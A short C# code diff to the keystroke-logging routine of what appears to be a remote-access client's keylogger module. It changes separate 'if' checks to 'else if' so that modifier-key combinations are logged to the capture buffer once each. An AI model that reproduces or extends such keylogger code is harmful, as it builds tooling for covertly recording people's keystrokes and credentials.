@@ -215,15 +215,15 @@ namespace xClient.Core.Keylogger
                                     {
                                         _logFileBuffer.Append(HighlightSpecialKey("SHIFT-CTRL-ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
                                     }
-                                    if (k.AltKey && k.ControlKey && !k.ShiftKey)
+                                    else if (k.AltKey && k.ControlKey && !k.ShiftKey)
                                     {
                                         _logFileBuffer.Append(HighlightSpecialKey("CTRL-ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
                                     }
-                                    if (k.AltKey && !k.ControlKey)
+                                    else if (k.AltKey && !k.ControlKey)
                                     {
                                         _logFileBuffer.Append(HighlightSpecialKey("ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
                                     }
-                                    if (k.ControlKey && !k.AltKey)
+                                    else if (k.ControlKey && !k.AltKey)
                                     {
                                         _logFileBuffer.Append(HighlightSpecialKey("CTRL-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
                                     }
